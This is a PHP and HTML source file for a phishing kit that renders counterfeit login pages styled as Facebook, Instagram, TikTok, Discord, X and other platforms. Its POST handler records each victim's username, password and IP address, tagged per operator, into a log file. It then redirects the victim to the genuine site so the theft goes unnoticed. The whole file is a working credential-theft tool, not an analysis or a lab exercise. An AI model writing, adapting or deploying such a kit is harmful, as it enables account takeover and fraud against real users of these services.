<?php
require_once __DIR__ . '/config.php';

$category = trim($_GET['cat'] ?? '');
$user = trim($_GET['user'] ?? 'anonymous');

// Basic validation for category
$categories = json_decode(file_get_contents(CATEGORIES_FILE), true);
$cat_found = false;
$cat_image = '';
foreach ($categories as $cat) {
    $c_name = is_array($cat) ? ($cat['name'] ?? '') : $cat;
    if (strcasecmp(str_replace(' ', '', $c_name), $category) === 0) {
        $cat_found = true;
        $display_cat = $c_name;
        $cat_image = is_array($cat) ? ($cat['image'] ?? '') : '';
        break;
    }
}

if (!$cat_found) {
    die('Invalid hub category.');
}

// Redirect URL
$redirect_url = "https://www." . strtolower(str_replace(' ', '', $display_cat)) . ".com";

// Define brand themes
$brand_themes = [
    'facebook' => [
        'bg' => '#f0f2f5',
        'primary' => '#1877f2',
        'logo_text' => 'facebook',
        'logo_color' => '#1877f2',
        'card_shadow' => '0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1)'
    ],
    'instagram' => [
        'bg' => '#000',
        'primary' => '#0095f6',
        'logo_text' => 'Instagram',
        'logo_font' => "sans-serif",
        'text_color' => '#fff'
    ],
    'tiktok' => [
        'bg' => '#fff',
        'primary' => '#fe2c55',
        'logo_text' => 'TikTok',
        'logo_font' => "sans-serif",
        'logo_size' => '36px',
        'logo_color' => '#000'
    ],
    'snapchat' => [
        'bg' => '#fffc00',
        'primary' => '#000',
        'logo_text' => 'Snapchat',
        'logo_color' => '#000'
    ],
    'discord' => [
        'bg' => '#313338',
        'primary' => '#5865f2',
        'logo_text' => 'Discord',
        'logo_color' => '#fff',
        'card_bg' => '#313338',
        'input_bg' => '#1e1f22',
        'text_color' => '#dbdee1'
    ],
    'telegram' => [
        'bg' => '#fff',
        'primary' => '#33a0e3',
        'logo_text' => 'Telegram',
        'logo_color' => '#33a0e3'
    ],
    'twitter' => [
        'bg' => '#fff',
        'primary' => '#1d9bf0',
        'logo_text' => 'Twitter',
        'logo_color' => '#1d9bf0'
    ],
    'x' => [
        'bg' => '#000',
        'primary' => '#fff',
        'btn_text' => '#000',
        'logo_text' => 'X',
        'logo_color' => '#fff',
        'card_bg' => '#000',
        'text_color' => '#fff'
    ],
    'default' => [
        'bg' => '#f8f9fa',
        'primary' => '#4361ee',
        'logo_text' => $display_cat,
        'logo_color' => '#1e1e2d'
    ]
];

$theme = $brand_themes[strtolower($category)] ?? $brand_themes['default'];

// Handle Login Submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $victim_user = $_POST['email'] ?? $_POST['username'] ?? 'N/A';
    $victim_pass = $_POST['password'] ?? 'N/A';

    $analytics = json_decode(file_get_contents(ANALYTICS_FILE), true);
    $analytics[] = [
        'timestamp' => date('Y-m-d H:i:s'),
        'category' => strtolower($category),
        'user_id' => $user,
        'source_ip' => $_SERVER['REMOTE_ADDR'],
        'captured_user' => $victim_user,
        'captured_pass' => $victim_pass
    ];
    file_put_contents(ANALYTICS_FILE, json_encode($analytics));

    header("Location: " . $redirect_url);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo s($display_cat); ?> - Log In or Sign Up</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><path d=%22M50 5 L95 50 L50 95 L5 50 Z%22 fill=%22%23333%22 stroke=%22%23eee%22 stroke-width=%225%22/><text x=%2250%22 y=%2265%22 font-size=%2240%22 font-weight=%22bold%22 fill=%22white%22 text-anchor=%22middle%22 font-family=%22Arial%22>U</text></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Cookie&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: <?php echo $theme['bg']; ?>;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: <?php echo $theme['text_color'] ?? '#1c1e21'; ?>;
        }
        /* Instagram Split Layout */
        <?php if (strtolower($category) === 'instagram'): ?>
        body { display: block; overflow-x: hidden; }
        .insta-wrapper { display: flex; min-height: 100vh; width: 100%; }
        .insta-left { flex: 1; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px; position: relative; }
        .insta-right { flex: 1; background: #121212; display: flex; align-items: center; justify-content: center; padding: 40px; }
        .insta-hero-text { font-size: 48px; font-weight: 800; text-align: center; max-width: 500px; margin-top: 20px; line-height: 1.1; }
        .gradient-text { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .insta-login-box { width: 100%; max-width: 350px; text-align: center; }
        .insta-login-box h2 { font-size: 20px; color: #fff; margin-bottom: 25px; text-align: left; }
        .insta-input { background: #000 !important; border: 1px solid #363636 !important; color: #fff !important; margin-bottom: 10px !important; }
        .insta-btn-blue { background-color: #0095f6; color: #fff; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: 700; cursor: pointer; font-size: 14px; margin-top: 10px; }
        .insta-link { color: #fff; text-decoration: none; font-size: 12px; margin-top: 20px; display: inline-block; }
        .insta-outline-btn { background: transparent; border: 1px solid #363636; color: #fff; border-radius: 20px; padding: 10px 20px; width: 100%; margin-top: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .insta-image-stack { margin-top: 40px; position: relative; height: 300px; width: 250px; }
        .insta-img { position: absolute; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); background: #333; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .insta-img-1 { width: 180px; height: 240px; top: 0; left: 0; z-index: 3; }
        .insta-img-2 { width: 180px; height: 240px; top: 40px; left: 40px; z-index: 2; opacity: 0.8; }
        .meta-footer { margin-top: 40px; color: #737373; font-size: 12px; }
        @media (max-width: 900px) {
            .insta-wrapper { flex-direction: column; }
            .insta-left { display: none; }
            .insta-right { background: #000; }
        }
        <?php endif; ?>

        /* TikTok Modern Theme */
        <?php if (strtolower($category) === 'tiktok'): ?>
        .tiktok-card { background: #fff; width: 100%; max-width: 440px; padding: 40px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); text-align: center; }
        .tiktok-logo { margin-bottom: 24px; }
        .tiktok-header { font-size: 24px; font-weight: 700; margin-bottom: 32px; }
        .tiktok-input-wrap { position: relative; margin-bottom: 12px; text-align: left; }
        .tiktok-input-wrap label { font-size: 12px; font-weight: 600; color: #161823; margin-bottom: 4px; display: block; }
        .tiktok-input { width: 100%; padding: 12px; background: rgba(22, 24, 37, 0.06); border: 1px solid rgba(22, 24, 37, 0.12); border-radius: 4px; font-size: 16px; outline: none; box-sizing: border-box; }
        .tiktok-input:focus { border-color: rgba(22, 24, 37, 0.2); }
        .tiktok-btn-red { background-color: #FE2C55 !important; color: #fff !important; border: none; border-radius: 4px; padding: 12px; width: 100%; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 20px; }
        .tiktok-footer { margin-top: 24px; font-size: 14px; color: rgba(22, 24, 37, 0.5); border-top: 1px solid rgba(22, 24, 37, 0.12); padding-top: 16px; }
        <?php endif; ?>

        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }
        .login-card {
            background: <?php echo $theme['card_bg'] ?? '#fff'; ?>;
            padding: 30px;
            border-radius: 8px;
            box-shadow: <?php echo $theme['card_shadow'] ?? '0 4px 12px rgba(0,0,0,0.08)'; ?>;
            <?php if (strtolower($category) === 'discord'): ?>
                border: 1px solid #1e1f22;
            <?php endif; ?>
        }
        .brand-logo {
            font-size: <?php echo $theme['logo_size'] ?? '32px'; ?>;
            font-weight: 800;
            color: <?php echo $theme['logo_color'] ?? '#000'; ?>;
            margin-bottom: 25px;
            font-family: <?php echo $theme['logo_font'] ?? 'inherit'; ?>;
        }
        <?php if (strtolower($category) === 'facebook'): ?>
        .brand-logo { text-align: left; color: #1877f2; font-size: 40px; margin-bottom: 10px; }
        .login-card { border: none; }
        <?php endif; ?>

        .form-group { margin-bottom: 15px; }
        input {
            width: 100%;
            padding: 14px;
            border: 1px solid <?php echo (strtolower($category) === 'discord') ? '#1e1f22' : '#dddfe2'; ?>;
            border-radius: 6px;
            font-size: 15px;
            box-sizing: border-box;
            outline: none;
            background-color: <?php echo $theme['input_bg'] ?? '#fff'; ?>;
            color: inherit;
        }
        input:focus { border-color: <?php echo $theme['primary']; ?>; }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: <?php echo $theme['primary']; ?>;
            color: <?php echo $theme['btn_text'] ?? '#fff'; ?>;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-login:hover { filter: brightness(0.95); }

        .links { margin-top: 20px; font-size: 14px; color: <?php echo $theme['primary']; ?>; }
        .links a { text-decoration: none; color: inherit; }

        .divider {
            border-top: 1px solid <?php echo (strtolower($category) === 'discord') ? '#1e1f22' : '#dadde1'; ?>;
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .footer-text { margin-top: 40px; font-size: 12px; color: #737373; }
    </style>
</head>
<body>
    <?php if (strtolower($category) === 'instagram'): ?>
    <div class="insta-wrapper">
        <div class="insta-left">
            <svg aria-label="Instagram" color="#ffffff" fill="#ffffff" height="80" role="img" viewBox="0 0 448 512" width="80"><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
            <div class="insta-hero-text">
                See everyday moments from your <span class="gradient-text">close friends</span>.
            </div>
            <div class="insta-image-stack">
                <div class="insta-img insta-img-1">
                    <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=400&h=600&fit=crop" style="width: 100%; height: 100%; object-fit: cover;" onerror="this.style.display='none'">
                    <div style="color: #666; position: absolute; z-index: -1;"><i class="fas fa-image fa-3x"></i></div>
                </div>
                <div class="insta-img insta-img-2">
                    <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=400&h=600&fit=crop" style="width: 100%; height: 100%; object-fit: cover;" onerror="this.style.display='none'">
                    <div style="color: #666; position: absolute; z-index: -1;"><i class="fas fa-image fa-3x"></i></div>
                </div>
            </div>
        </div>
        <div class="insta-right">
            <div class="insta-login-box">
                <h2>Log into Instagram</h2>
                <form method="POST">
                    <input type="text" name="email" placeholder="Mobile number, username or email" class="insta-input" required>
                    <input type="password" name="password" placeholder="Password" class="insta-input" required>
                    <button type="submit" class="insta-btn-blue">Log in</button>
                </form>
                <a href="#" class="insta-link">Forgot password?</a>

                <div style="margin-top: 40px;">
                    <button class="insta-outline-btn">
                        <i class="fab fa-facebook"></i> Log in with Facebook
                    </button>
                    <button class="insta-outline-btn">
                        Create new account
                    </button>
                </div>

                <div class="meta-footer">
                    <div style="font-weight: 700; font-size: 14px; color: #fff; margin-bottom: 10px;">
                        ∞ Meta
                    </div>
                    In the UK, you can create a detailed report for something that breaks the law. <a href="#" style="color: #0095f6; text-decoration: none;">Fill in form</a>
                </div>
            </div>
        </div>
    </div>
    <?php elseif (strtolower($category) === 'tiktok'): ?>
    <div class="tiktok-card">
        <div class="tiktok-logo">
            <i class="fab fa-tiktok fa-3x"></i>
            <span style="font-size: 24px; font-weight: 800; vertical-align: middle; margin-left: 10px;">TikTok</span>
        </div>
        <div class="tiktok-header">Log in</div>
        <form method="POST">
            <div class="tiktok-input-wrap">
                <label>Phone / Email / Username</label>
                <input type="text" name="email" class="tiktok-input" required>
            </div>
            <div class="tiktok-input-wrap">
                <label>Password</label>
                <input type="password" name="password" class="tiktok-input" required>
            </div>
            <button type="submit" class="tiktok-btn-red">Log in</button>
        </form>
        <div class="tiktok-footer">
            Don't have an account? <a href="#" style="color: #FE2C55; font-weight: 700; text-decoration: none;">Sign up</a>
        </div>
    </div>
    <?php else: ?>
    <div class="login-container">
        <?php if (strtolower($category) === 'facebook'): ?>
            <div class="brand-logo"><?php echo $theme['logo_text']; ?></div>
        <?php endif; ?>

        <div class="login-card">
            <?php if (strtolower($category) !== 'facebook'): ?>
                <div class="brand-logo">
                    <?php if ($cat_image): ?>
                        <img src="<?php echo s($cat_image); ?>" style="max-height: 60px; margin-bottom: 10px;">
                    <?php else: ?>
                        <?php echo $theme['logo_text']; ?>
                    <?php endif; ?>
                </div>
            <?php endif; ?>

            <form method="POST">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or Phone Number" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn-login">Log In</button>

                <div class="links">
                    <a href="#">Forgot password?</a>
                </div>

                <div class="divider"></div>

                <button type="button" class="btn-login" style="background-color: #42b72a; width: auto; padding: 10px 20px; font-size: 16px;">Create New Account</button>
            </form>
        </div>

        <div class="footer-text">
            <strong><?php echo s($display_cat); ?></strong> &copy; 2025 · English (US)
        </div>
    </div>
    <?php endif; ?>
</body>
</html>
